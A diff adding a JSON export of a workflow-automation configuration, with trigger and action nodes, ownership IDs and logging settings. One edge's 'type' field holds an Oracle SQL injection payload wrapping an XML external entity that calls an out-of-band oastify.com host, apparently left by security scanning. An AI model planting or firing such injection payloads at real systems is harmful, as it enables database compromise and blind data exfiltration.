@@ -1,0 +1,60 @@
+{
+	"appsUsed":[
+		
+	],
+	"createdTime":1741578602078,
+	"deleted":true,
+	"description":"Describe your automation in a few words",
+	"edges":[
+		{
+			"fromNodeId":"CqCan",
+			"priority":0,
+			"skip":false,
+			"toNodeId":"bAyA2",
+			"type":"(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % whsna SYSTEM \"http://mg6q650g9twl0t9jp2g2cvbco3uwis6vunhq5f.oasti'||'fy.com/\">%whsna;]>'),'/l') from dual)"
+		}
+	],
+	"id":"67ce616add8cc819cebccbef",
+	"lastModifiedBy":22743,
+	"lcName":"aokwzt",
+	"modifiedTime":1741670024978,
+	"name":"AokwZT",
+	"nodes":[
+		{
+			"debug":false,
+			"dirty":false,
+			"fallbackMode":"STOP",
+			"groupId":"CqCan-1",
+			"id":"CqCan",
+			"index":0,
+			"skip":false,
+			"title":"Select a trigger event",
+			"trigger":{
+				"type":"EVENT"
+			},
+			"type":"START"
+		},
+		{
+			"debug":false,
+			"dirty":false,
+			"fallbackMode":"STOP",
+			"groupId":"CqCan-1",
+			"id":"bAyA2",
+			"index":0,
+			"skip":false,
+			"title":"Select an app and action",
+			"type":"ACTION"
+		}
+	],
+	"ownerUserId":22743,
+	"settings":{
+		"enableNodeLevelLogging":true,
+		"enableRunLogging":true,
+		"enableVariableLogging":true
+	},
+	"standard":false,
+	"tags":[
+		
+	],
+	"version":1
+}
